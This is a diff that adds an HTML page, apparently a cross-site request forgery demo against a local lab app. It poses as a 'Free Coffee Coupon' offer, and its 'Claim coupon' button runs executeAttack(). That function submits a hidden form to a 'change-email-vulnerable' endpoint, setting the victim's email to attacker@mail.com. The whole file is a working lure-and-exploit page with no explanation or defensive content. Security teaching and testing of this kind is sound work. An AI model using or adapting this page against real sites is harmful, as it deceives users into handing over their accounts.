@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Coffee Coupon</title>
+    <style>
+        body{
+            font-family: Arial;
+            background:#f5f5f5;
+            text-align:center;
+            margin-top:100px;
+        }
+
+        .card{
+            background:white;
+            width:420px;
+            margin:auto;
+            padding:40px;
+            border-radius:10px;
+            box-shadow:0 10px 25px rgba(0,0,0,0.1);
+        }
+
+        button{
+            background:#4CAF50;
+            color:white;
+            border:none;
+            padding:14px 28px;
+            font-size:16px;
+            border-radius:6px;
+            cursor:pointer;
+            margin-top:20px;
+        }
+
+        button:hover{
+            background:#43a047;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+
+<h2>Congratulations!</h2>
+
+<p>You have received a free coffee coupon.</p>
+
+<p>Click the button below to claim your reward.</p>
+
+<form id="csrfForm" action="http://127.0.0.1:8000/change-email-vulnerable/" method="GET">
+    <input type="hidden" name="new_email" value="attacker@mail.com">
+</form>
+
+<button onclick="executeAttack()">Claim coupon</button>
+
+</div>
+
+<script>
+function executeAttack(){
+    document.getElementById("csrfForm").submit();
+}
+</script>
+
+</body>
+</html>
